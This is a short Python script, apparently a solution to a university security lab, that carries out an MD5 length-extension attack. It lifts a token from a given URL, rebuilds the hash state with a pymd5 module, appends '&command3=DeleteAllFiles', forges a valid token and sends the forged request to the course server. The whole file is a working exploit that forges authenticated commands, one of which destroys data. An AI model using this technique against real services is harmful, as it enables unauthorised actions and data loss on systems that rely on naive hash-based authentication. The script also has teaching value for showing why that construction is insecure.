import http.client 
import urllib.parse 
import sys
import pymd5 



if len(sys.argv) != 2:
    print('Requires the URL to extend as a command line argument.') 
    exit(1)

#setting up vars to be used later
original_url = sys.argv[1]
suffix = b"&command3=DeleteAllFiles"
startHash = original_url[37:69]
message_padding = pymd5.padding(51*8)

#calc padding
bits = int(8+len(pymd5.padding(8*8)))*8
     
#restore state of prev hash 
#count is 512 cuz message is never more than a single block
h = pymd5.md5(state = bytes.fromhex(startHash), count = 512)

#extend it
h.update(suffix)

#format strings to be put into new url
finalHash = h.hexdigest()
url_safe_padding = urllib.parse.quote(message_padding)
new_url = "https://csci3403.com/proj1/api?token=%s&user=admin&command1=ListFiles&command2=NoOp%s&command3=DeleteAllFiles" % (finalHash,url_safe_padding)

# The following code requests the URL and returns the response from the server
parsed_url = urllib.parse.urlparse(new_url)
conn = http.client.HTTPSConnection(parsed_url.hostname, parsed_url.port)
conn.request("GET", parsed_url.path + "?" + parsed_url.query) 

print(conn.getresponse().read())